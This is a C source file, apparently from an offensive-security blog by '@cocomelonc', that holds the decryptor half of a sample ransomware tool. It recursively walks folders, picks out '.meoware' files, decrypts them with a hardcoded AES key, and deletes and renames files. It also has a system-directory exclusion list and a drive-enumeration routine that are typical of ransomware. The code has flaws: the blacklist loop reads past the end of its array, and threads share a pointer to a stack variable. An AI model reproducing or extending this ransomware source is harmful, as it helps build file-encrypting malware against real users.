/*
 * hack-aes-decryptor-original.c
 * Ransomware AES decryption
 * save original extension
 * author @cocomelonc
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>

#define AES_BLOCK_SIZE 16
#define IN_CHUNK_SIZE (AES_BLOCK_SIZE * 10)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2)
#define MAX_THREADS 8  // Adjust as needed
#define MAX_FOLDERS 26
#define MAX_PATH_LENGTH 260

// we do not encrypt sensitive folders and files
const char* blacklistDirectories[] = {
  "C:\\Windows\\",
  "C:\\Program Files (x86)\\",
  "C:\\Program Files\\",
  "C:\\ProgramData\\",
  "Z:\\",
};

// Structure to hold data for each thread
struct ThreadData {
  const char* inputFile;
  const char* outputFile;
  const BYTE* aesKey;
};

void decryptFile(const char* inputFile, const char* outputFile, const BYTE* aesKey) {
  HCRYPTPROV hCryptProv = NULL;
  HCRYPTKEY hKey = NULL;
  HANDLE hInputFile = INVALID_HANDLE_VALUE;
  HANDLE hOutputFile = INVALID_HANDLE_VALUE;

  DWORD len = strlen(aesKey);
  DWORD key_size = len * sizeof(aesKey[0]);

  // Open input file for reading
  hInputFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hInputFile == INVALID_HANDLE_VALUE) {
    return;
  }

  // Create output file for writing
  hOutputFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hOutputFile == INVALID_HANDLE_VALUE) {
    CloseHandle(hInputFile);
    return;
  }

  // Cryptographic service provider
  if (!CryptAcquireContextA(&hCryptProv, NULL, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
    return;
  }

  HCRYPTHASH hHash;
  if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
    return;
  }

  if (!CryptHashData(hHash, (BYTE*)aesKey, key_size, 0)) {
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
    return;
  }

  if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);
    return;
  }

  const size_t chunk_size = IN_CHUNK_SIZE;
  BYTE* chunk = (BYTE*)malloc(chunk_size);
  DWORD out_len = 0;

  BOOL isFinal = FALSE;
  DWORD readTotalSize = 0;
  BOOL bResult = FALSE;

  DWORD inputSize = GetFileSize(hInputFile, NULL);

  while (bResult = ReadFile(hInputFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
    if (0 == out_len) {
      break;
    }
    readTotalSize += out_len;
    if (readTotalSize >= inputSize) {
      isFinal = TRUE;
    }

    if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
      CryptDestroyKey(hKey);
      CryptReleaseContext(hCryptProv, 0);
      break;
    }
    DWORD written = 0;
    if (!WriteFile(hOutputFile, chunk, out_len, &written, NULL)) {
      CloseHandle(hOutputFile);
      break;
    }
    memset(chunk, 0, chunk_size);
  }

  // Delete the original file after decryption
  if (!DeleteFileA(inputFile)) {
    printf("Error deleting file %s: %d\n", inputFile, GetLastError());
  } else {
    printf("Successfully deleted the original file: %s\n", inputFile);
  }

  // Try renaming the output file back to original name
  char newFileName[MAX_PATH];
  snprintf(newFileName, MAX_PATH, "%s", inputFile);  // Use the original file name

  // Try renaming output file (with .decrypted extension) back to original file name
  if (MoveFileA(outputFile, newFileName)) {
    printf("Successfully restored original file: %s\n", newFileName);
  } else {
    printf("Error restoring original file: %d\n", GetLastError());
  }

  // Ensure no file handles are left open
  if (hKey != NULL) {
    CryptDestroyKey(hKey);
  }
  if (hCryptProv != NULL) {
    CryptReleaseContext(hCryptProv, 0);
  }
  if (hInputFile != INVALID_HANDLE_VALUE) {
    CloseHandle(hInputFile);
  }
  if (hOutputFile != INVALID_HANDLE_VALUE) {
    CloseHandle(hOutputFile);
  }

  free(chunk);
}

// encryption function to be called by each thread
unsigned __stdcall decryptFileThread(void* args) {
  struct ThreadData* threadData = (struct ThreadData*)args;
  decryptFile(threadData->inputFile, threadData->outputFile, threadData->aesKey);
  return 0;
}

void decryptFiles(const char* folderPath, const BYTE* key) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("Error: %d\n", GetLastError());
    return;
  }

  HANDLE threadHandles[MAX_THREADS];
  int threadCount = 0;

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    int isBlacklisted = 0;
    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
        isBlacklisted = 1;
        break;
      }
    }

    if (!isBlacklisted) {
      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
        // Recursive call for subfolders
        decryptFiles(filePath, key);
      } else {
        // Process individual files
        if (strstr(fileName, ".meoware") != NULL) {
          printf("File: %s\n", filePath);
          char decryptedFilePath[MAX_PATH];
          sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
          // decryptFile(filePath, decryptedFilePath, key);
          struct ThreadData threadData = { filePath, decryptedFilePath, key };

          // Start a new thread
          threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
          if (threadHandles[threadCount] == 0) {
            printf("error creating thread\n");
            return;
          }

          threadCount++;

          // Wait for threads to finish before processing the next file
          if (threadCount == MAX_THREADS) {
            WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

            // Close thread handles
            for (int i = 0; i < threadCount; i++) {
              CloseHandle(threadHandles[i]);
            }

            threadCount = 0;
          }
          printf("File decrypt: %s OK!\n", filePath);
        }
      }
    }

  } while (FindNextFileA(hFind, &findFileData) != 0);

  // Wait for remaining threads to finish
  WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

  // Close thread handles
  for (int i = 0; i < threadCount; i++) {
    CloseHandle(threadHandles[i]);
  }

  FindClose(hFind);
}

void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
  DWORD drives = GetLogicalDrives();
  char drive[] = "A:\\";
  int driveType;

  for (int i = 0; i < 26; ++i) {
    if (drives & 1) {
      drive[0] = 'A' + i;
      driveType = GetDriveTypeA(drive);

      if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        int isBlacklisted = 0;
        for (int j = 0; j < MAX_PATH_LENGTH; ++j) {
          if (blacklistDirectories[j] != NULL && strstr(drive, blacklistDirectories[j]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }

        if (!isBlacklisted) {
          strcpy_s(folders[*folderCount], drive);
          (*folderCount)++;
        }
      }
    }
    drives >>= 1;
  }
}

int main() {
  const char* rootFolder = "C:\\Users\\user1\\Desktop\\books";
  const char* privateKey = "mymy16ByteKey12";
  decryptFiles(rootFolder, privateKey);
  // char folders[MAX_FOLDERS][MAX_PATH];
  // int folderCount = 0;
  // enumerateDrives(folders, &folderCount);
  // // encrypt the enumerated folders
  // printf("Enumerated Folders:\n");
  // for (int i = 0; i < folderCount; ++i) {
  //   printf("%s\n", folders[i]);
  //   decryptFiles(folders[i], privateKey);
  // }
  return 0;
}